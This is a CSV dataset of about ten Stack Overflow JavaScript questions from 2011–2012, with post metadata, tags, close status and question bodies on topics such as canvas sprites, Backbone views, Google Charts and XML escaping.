PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
9235820,02/10/2012 22:40:46,1198922,02/09/2012 05:59:39,1,0,Function for the cost addition.,"Ok, I'm building a website and am having issues with the Javascript function. Users will input their name and number of credit hours they are taking.  The program will then calculate the total cost.  For full-time students, the cost per credit hours is $44.50.  For part-time students , the cost per credit hour is $50.00.  8% is charged for fees (calculate the cost for credit hours and then multiply it by 8% for the fee).

I need help with the function and how I would do this. Here is my current code:

    <html>
    <head>
    <script type=""text/javascript"">
    function totcost()
    }
    
    {
    </script>
    </head>
    <body>
    <p><b>Name: </b>
    <input type=""text"" name=""name"" />
    <br>
    <br><b>Credit Hours:</b> 
    <input type=""text"" name=""credithours"" /><br>
    <br>
    <input type=""radio"" name=""fullstudent"" />Full time student
    <input type=""radio"" name=""partstudent"" />Partime time student<br>
    <br>
    <button type=""button"">Calculate Tuition</button> 
    <form method=""post"" action="""">
    <textarea name=""comments"" cols=""40"" rows=""2"">
    </textarea><br>
    </form>
    
    </body>
    </html>",javascript,,,,,02/11/2012 02:20:08,too localized,1,232,5,"Function for the cost addition. Ok, I'm building a website and am having issues with the Javascript function. Users will input their name and number of credit hours they are taking.  The program will then calculate the total cost.  For full-time students, the cost per credit hours is $44.50.  For part-time students , the cost per credit hour is $50.00.  8% is charged for fees (calculate the cost for credit hours and then multiply it by 8% for the fee).

I need help with the function and how I would do this. Here is my current code:

    <html>
    <head>
    <script type=""text/javascript"">
    function totcost()
    }
    
    {
    </script>
    </head>
    <body>
    <p><b>Name: </b>
    <input type=""text"" name=""name"" />
    <br>
    <br><b>Credit Hours:</b> 
    <input type=""text"" name=""credithours"" /><br>
    <br>
    <input type=""radio"" name=""fullstudent"" />Full time student
    <input type=""radio"" name=""partstudent"" />Partime time student<br>
    <br>
    <button type=""button"">Calculate Tuition</button> 
    <form method=""post"" action="""">
    <textarea name=""comments"" cols=""40"" rows=""2"">
    </textarea><br>
    </form>
    
    </body>
    </html>",1
11324393,07/04/2012 07:33:07,1462765,06/18/2012 05:11:08,27,0,Why it is not possible to get full path in FF and Chrome,"I googled alot to know whats the reason behind FF and Chrome not returning full path of the browsed file.I every where found saying that ""it's not possible because of security issues"".I still have a doubt what the security issues can be.Could any one please clarify my doubt.
And even wanna know is there any cross browsers solution for this problem
Thanks!",javascript,,,,,07/26/2012 20:55:46,not a real question,1,60,13,"Why it is not possible to get full path in FF and Chrome I googled alot to know whats the reason behind FF and Chrome not returning full path of the browsed file.I every where found saying that ""it's not possible because of security issues"".I still have a doubt what the security issues can be.Could any one please clarify my doubt.
And even wanna know is there any cross browsers solution for this problem
Thanks!",1
7910558,10/27/2011 00:42:37,974627,10/01/2011 16:04:30,8,0,Animating sprite frames in canvas,"I'm making a small platform game with the canvas element and I'm having trouble working out the best way to use sprites.

Canvas doesn't support animated GIFs, so I can't do that, so instead I made a film strip for my animated sprites to give the illusion that a character is moving. Like this: http://i.imgur.com/wDX5R.png

Here's the relevant code:

    function player() {
    	
    	this.idleSprite = new Image();
    	this.idleSprite.src = ""/game/images/idleSprite.png"";
    	this.idleSprite.frameWidth = 28;
    	this.idleSprite.frameHeight = 40;
    	this.idleSprite.frameCount = 12;
    	
    	this.runningSprite = new Image();
    	this.runningSprite.src = ""/game/images/runningSprite.png"";
    	this.runningSprite.frameWidth = 34;
    	
    	this.update = function() {
    		
    	}
    	
    	var frameCount = 1;
    	this.draw = function() {
    		c.drawImage(this.idleSprite, this.idleSprite.frameWidth * frameCount, 0, this.idleSprite.frameWidth, this.idleSprite.frameHeight, 0, 0, this.idleSprite.frameWidth, this.idleSprite.frameHeight);
    		if(frameCount < this.idleSprite.frameCount - 1) { frameCount++; } else { frameCount = 0; }
    	}
    }
    
    var player = new player();

As you can see, I'm defining the idle sprite and also its frame width and frame count. Then in my draw method, I'm using those properties to tell the drawImage method what frame to draw. Everything works fine, but I'm unhappy with the `frameCount` variable defined before the draw method. It seems... hacky and ugly. Would there be a way that people know of to achieve the same effect without keeping track of the frames outside the draw method? Or even a better alternative to drawing animated sprites to canvas would be good.

Thanks.",javascript,canvas,,,,,open,0,301,5,"Animating sprite frames in canvas I'm making a small platform game with the canvas element and I'm having trouble working out the best way to use sprites.

Canvas doesn't support animated GIFs, so I can't do that, so instead I made a film strip for my animated sprites to give the illusion that a character is moving. Like this: http://i.imgur.com/wDX5R.png

Here's the relevant code:

    function player() {
    	
    	this.idleSprite = new Image();
    	this.idleSprite.src = ""/game/images/idleSprite.png"";
    	this.idleSprite.frameWidth = 28;
    	this.idleSprite.frameHeight = 40;
    	this.idleSprite.frameCount = 12;
    	
    	this.runningSprite = new Image();
    	this.runningSprite.src = ""/game/images/runningSprite.png"";
    	this.runningSprite.frameWidth = 34;
    	
    	this.update = function() {
    		
    	}
    	
    	var frameCount = 1;
    	this.draw = function() {
    		c.drawImage(this.idleSprite, this.idleSprite.frameWidth * frameCount, 0, this.idleSprite.frameWidth, this.idleSprite.frameHeight, 0, 0, this.idleSprite.frameWidth, this.idleSprite.frameHeight);
    		if(frameCount < this.idleSprite.frameCount - 1) { frameCount++; } else { frameCount = 0; }
    	}
    }
    
    var player = new player();

As you can see, I'm defining the idle sprite and also its frame width and frame count. Then in my draw method, I'm using those properties to tell the drawImage method what frame to draw. Everything works fine, but I'm unhappy with the `frameCount` variable defined before the draw method. It seems... hacky and ugly. Would there be a way that people know of to achieve the same effect without keeping track of the frames outside the draw method? Or even a better alternative to drawing animated sprites to canvas would be good.

Thanks.",2
11238192,06/28/2012 04:45:41,1487483,06/28/2012 04:44:01,1,0,Jquery display a part image Hover,"Please i'm looking for a method or a plugin tha  can allow me  to showa part of an image that can allow me  to  display  a part of an image  when  a mouse  is Hover it 

Like  here  http://www.artfloor.com/ebn.ebn?pid=438&oeuvre=14390&artiste=91

Thanks",javascript,jquery,html5,jquery-plugins,jquery-selectors,06/28/2012 06:59:54,not a real question,1,49,6,"Jquery display a part image Hover Please i'm looking for a method or a plugin tha  can allow me  to showa part of an image that can allow me  to  display  a part of an image  when  a mouse  is Hover it 

Like  here  http://www.artfloor.com/ebn.ebn?pid=438&oeuvre=14390&artiste=91

Thanks",5
9146268,02/05/2012 01:53:38,1190088,02/05/2012 01:36:47,1,0,Google Interactive Charts not loading when UpdatePanel is refreshed,"Help! I've spent hours researching this and can't find a solution. I'm using the Google Interactive Charts API in an UpdatePanel which asynchronously refreshes when I change the selection in a dropdownlist, which ultimately changes the data set for the Google chart. The problem is that the chart disappears when the UpdatePanel refreshes. I am using RegisterStartupScript and I have tested a javascript alert in the updatepanel to confirm that javascript works in the UpdatePanel when it refreshes, so the problem seems confined to whatever the Google javascript is doing. Perhaps it's the setOnLoadCallback not actually calling drawChart after UpdatePanel is refreshed? Not sure if that's it or how to fix it. 

The code below is in a Public Sub which is called on Page_Load and when the dropdownlist's selected value is changed.


        Dim strOutput As New StringBuilder

        strOutput.Append(""google.load('visualization', '1.0', { 'packages': ['corechart'] });"")
        strOutput.Append(""google.setOnLoadCallback(drawChart);"")
        strOutput.Append(""function drawChart() {"")
        strOutput.Append(""var data = new google.visualization.DataTable();"")
        strOutput.Append(""data.addColumn('string', 'Domain');"")
        strOutput.Append(""data.addColumn('number', 'Value');"")
        strOutput.Append(""data.addRows(["")

        Dim sqlSelect As New SqlClient.SqlCommand
        sqlSelect.CommandText = String.Format(""spAnalytics_ViewsByDomain"")
        sqlSelect.CommandType = CommandType.StoredProcedure
        Dim dtChartData As DataTable = clsDB.FillDT(sqlSelect)

        Dim commaCounter As Integer = 1
        For Each row As DataRow In dtChartData.Rows
            If ddlStat.SelectedValue = ""hits"" Then
                strOutput.Append(String.Format(""['{0}',{1}]"", row.Item(""domain""), row.Item(""hit_count"")))
            ElseIf ddlStat.SelectedValue = ""sessions"" Then
                strOutput.Append(String.Format(""['{0}',{1}]"", row.Item(""domain""), row.Item(""session_count"")))
            End If
            If commaCounter <> dtChartData.Rows.Count Then strOutput.Append("","")
            commaCounter = commaCounter + 1
        Next

        strOutput.Append(""]);"")

        strOutput.Append(""var options = { 'title': 'Views by domain',"")
        strOutput.Append(""'width': 500,"")
        strOutput.Append(""'height': 300"")
        strOutput.Append(""};"")
        strOutput.Append(""var chart = new google.visualization.PieChart(document.getElementById('chart_div'));"")
        strOutput.Append(""chart.draw(data, options);"")
        strOutput.Append(""}"")

        ScriptManager.RegisterStartupScript(litDomains, GetType(String), ""blahblah"", strOutput.ToString, True)",javascript,asp.net,ajax,updatepanel,google-charts,,open,0,498,9,"Google Interactive Charts not loading when UpdatePanel is refreshed Help! I've spent hours researching this and can't find a solution. I'm using the Google Interactive Charts API in an UpdatePanel which asynchronously refreshes when I change the selection in a dropdownlist, which ultimately changes the data set for the Google chart. The problem is that the chart disappears when the UpdatePanel refreshes. I am using RegisterStartupScript and I have tested a javascript alert in the updatepanel to confirm that javascript works in the UpdatePanel when it refreshes, so the problem seems confined to whatever the Google javascript is doing. Perhaps it's the setOnLoadCallback not actually calling drawChart after UpdatePanel is refreshed? Not sure if that's it or how to fix it. 

The code below is in a Public Sub which is called on Page_Load and when the dropdownlist's selected value is changed.


        Dim strOutput As New StringBuilder

        strOutput.Append(""google.load('visualization', '1.0', { 'packages': ['corechart'] });"")
        strOutput.Append(""google.setOnLoadCallback(drawChart);"")
        strOutput.Append(""function drawChart() {"")
        strOutput.Append(""var data = new google.visualization.DataTable();"")
        strOutput.Append(""data.addColumn('string', 'Domain');"")
        strOutput.Append(""data.addColumn('number', 'Value');"")
        strOutput.Append(""data.addRows(["")

        Dim sqlSelect As New SqlClient.SqlCommand
        sqlSelect.CommandText = String.Format(""spAnalytics_ViewsByDomain"")
        sqlSelect.CommandType = CommandType.StoredProcedure
        Dim dtChartData As DataTable = clsDB.FillDT(sqlSelect)

        Dim commaCounter As Integer = 1
        For Each row As DataRow In dtChartData.Rows
            If ddlStat.SelectedValue = ""hits"" Then
                strOutput.Append(String.Format(""['{0}',{1}]"", row.Item(""domain""), row.Item(""hit_count"")))
            ElseIf ddlStat.SelectedValue = ""sessions"" Then
                strOutput.Append(String.Format(""['{0}',{1}]"", row.Item(""domain""), row.Item(""session_count"")))
            End If
            If commaCounter <> dtChartData.Rows.Count Then strOutput.Append("","")
            commaCounter = commaCounter + 1
        Next

        strOutput.Append(""]);"")

        strOutput.Append(""var options = { 'title': 'Views by domain',"")
        strOutput.Append(""'width': 500,"")
        strOutput.Append(""'height': 300"")
        strOutput.Append(""};"")
        strOutput.Append(""var chart = new google.visualization.PieChart(document.getElementById('chart_div'));"")
        strOutput.Append(""chart.draw(data, options);"")
        strOutput.Append(""}"")

        ScriptManager.RegisterStartupScript(litDomains, GetType(String), ""blahblah"", strOutput.ToString, True)",5
7126000,08/19/2011 18:44:33,181390,09/29/2009 20:17:31,40,0,Re-rending after showing/hiding DOM elements with Adobe DPS,"I'm trying to use the Adobe DPS to build a table of contents with HTML. The idea is that there are articles behind the chapter heads, and when you click a chapter head, the elements are displayed. It works great in Safari and Mobile Safari on the iPad.

The problem lies in the Adobe DPS environment. When I click load the new elements (using jQuery to toggle the CSS from display:none; to display:block;), the Adobe Suite doesn't readjust the scrollable area until I rotate the iPad meaning, I can't actually scroll through my elements.

Has anyone had a similar problem like this? Should I not be building this in HTML? It seemed like the most straightforward route.",javascript,dom,adobe,webpage-rendering,,,open,0,115,8,"Re-rending after showing/hiding DOM elements with Adobe DPS I'm trying to use the Adobe DPS to build a table of contents with HTML. The idea is that there are articles behind the chapter heads, and when you click a chapter head, the elements are displayed. It works great in Safari and Mobile Safari on the iPad.

The problem lies in the Adobe DPS environment. When I click load the new elements (using jQuery to toggle the CSS from display:none; to display:block;), the Adobe Suite doesn't readjust the scrollable area until I rotate the iPad meaning, I can't actually scroll through my elements.

Has anyone had a similar problem like this? Should I not be building this in HTML? It seemed like the most straightforward route.",4
8779148,01/08/2012 16:27:39,1127846,01/03/2012 12:40:24,9,2,Implementing two DFP instances on the same page,"Is there an easy solution to load two different DFP ""configs"" (gads.JS and the other IDs required for DFP) on the same page? At the moment, we're using an external iframe to load and execute the JS files, but I'm not so keen on that implementation.

Ideally, I'd like to differentiate the two instances so I can operate on the last one loaded.

Thanks in advance!",javascript,google-dfp,,,,,open,0,64,8,"Implementing two DFP instances on the same page Is there an easy solution to load two different DFP ""configs"" (gads.JS and the other IDs required for DFP) on the same page? At the moment, we're using an external iframe to load and execute the JS files, but I'm not so keen on that implementation.

Ideally, I'd like to differentiate the two instances so I can operate on the last one loaded.

Thanks in advance!",2
6245341,06/05/2011 19:33:57,71976,02/27/2009 17:43:14,928,9,Using CoffeeScript in a production environment,"I really like using [CoffeeScript][1] (1.1.1) for small projects and it worked out great so far. However before using it in a more broad environment I would like to hear second opinions on using it in production.

So my questions are:

 - How stable is the language itself?
 - Do I need to watch for upcoming changes which will break my code?
 - If the answer is yes to the question above: how well are older versions supported?
 - Is there a stable (bug-fix only) and a separate development branch?
 - If you already did use CoffeeScript in your product/website/etc please describe the scope in which it was used and your overall experience.

Thanks!

**Note:** I've already heard that ""CoffeeScript support will be included in Ruby on Rails version 3.1."" (Wikipedia) which is great because of the additional backing from the Rails community.  


  [1]: http://jashkenas.github.com/coffee-script/",javascript,production-environment,coffeescript,,,01/15/2012 02:26:11,not constructive,1,145,6,"Using CoffeeScript in a production environment I really like using [CoffeeScript][1] (1.1.1) for small projects and it worked out great so far. However before using it in a more broad environment I would like to hear second opinions on using it in production.

So my questions are:

 - How stable is the language itself?
 - Do I need to watch for upcoming changes which will break my code?
 - If the answer is yes to the question above: how well are older versions supported?
 - Is there a stable (bug-fix only) and a separate development branch?
 - If you already did use CoffeeScript in your product/website/etc please describe the scope in which it was used and your overall experience.

Thanks!

**Note:** I've already heard that ""CoffeeScript support will be included in Ruby on Rails version 3.1."" (Wikipedia) which is great because of the additional backing from the Rails community.  


  [1]: http://jashkenas.github.com/coffee-script/",3
11555890,07/19/2012 07:29:11,1530719,07/17/2012 05:29:39,1,1,how to parse xml with special character? specifically for ampersand,"   I am getting data from text box and change it into xml format and store it in data base. For allowing special characters i wrote javascript function to replace special character with its html entities.

     ""     &quot;
     &     &amp;
     <     &lt;
     >     &gt;

   for ""quotes , less than , greater than"" its working fine.  for ""&"" it is showing xml parser error 
   i used javascript to replace special character with its entity 
         
      string.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;').replace(/""/g, '&quot;').replace(/'/g, ""\\'"");

      for ""&"" allow showing warning but it get stored in data base. please help me to sort out this problem . ",javascript,xml,special-characters,,,,open,0,161,10,"how to parse xml with special character? specifically for ampersand    I am getting data from text box and change it into xml format and store it in data base. For allowing special characters i wrote javascript function to replace special character with its html entities.

     ""     &quot;
     &     &amp;
     <     &lt;
     >     &gt;

   for ""quotes , less than , greater than"" its working fine.  for ""&"" it is showing xml parser error 
   i used javascript to replace special character with its entity 
         
      string.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;').replace(/""/g, '&quot;').replace(/'/g, ""\\'"");

      for ""&"" allow showing warning but it get stored in data base. please help me to sort out this problem . ",3
10618860,05/16/2012 12:46:31,143273,07/22/2009 23:02:38,1690,29,Backbone.js View Tagname set dynamically?,"I'm trying to set up the base architecture for a Phonegap project using jQueryMobile and Backbone.js  
We will be targeting multiple platforms and plan on expanding in the future.  
I want my Backbone code to be completely ignorant of the types of HTML elements associated with the Views since we have no idea what the views will look like across the platforms.  
A simple example would be that on one platform a List of items might be made from a `UL` and `LI` elements, but on another for some reason we might want to switch it to a `DIV` and `P` elements.  

At the moment, if I don't specify a tagName, it defaults to a `DIV`.  
I want to be able to provide a template like this on one page:  

    <script id=""attachmentTemplate"" type=""text/template"">
	     <li><a href=""#""><%= title %></a></li>
    </script>

and on another provide:  

    <script id=""attachmentTemplate"" type=""text/template"">
	    <p><a href=""#""><%= title %></a></p>
    </script>

I can't do that without specifying a tagName (as I said, it defaults to `DIV`).  

Does anyone have any advice or methods to do this?  The key is that I don't want the Javascript to be aware of the type of HTML element, I want the HTML to define that.",javascript,html,backbone.js,,,,open,0,228,5,"Backbone.js View Tagname set dynamically? I'm trying to set up the base architecture for a Phonegap project using jQueryMobile and Backbone.js  
We will be targeting multiple platforms and plan on expanding in the future.  
I want my Backbone code to be completely ignorant of the types of HTML elements associated with the Views since we have no idea what the views will look like across the platforms.  
A simple example would be that on one platform a List of items might be made from a `UL` and `LI` elements, but on another for some reason we might want to switch it to a `DIV` and `P` elements.  

At the moment, if I don't specify a tagName, it defaults to a `DIV`.  
I want to be able to provide a template like this on one page:  

    <script id=""attachmentTemplate"" type=""text/template"">
	     <li><a href=""#""><%= title %></a></li>
    </script>

and on another provide:  

    <script id=""attachmentTemplate"" type=""text/template"">
	    <p><a href=""#""><%= title %></a></p>
    </script>

I can't do that without specifying a tagName (as I said, it defaults to `DIV`).  

Does anyone have any advice or methods to do this?  The key is that I don't want the Javascript to be aware of the type of HTML element, I want the HTML to define that.",3
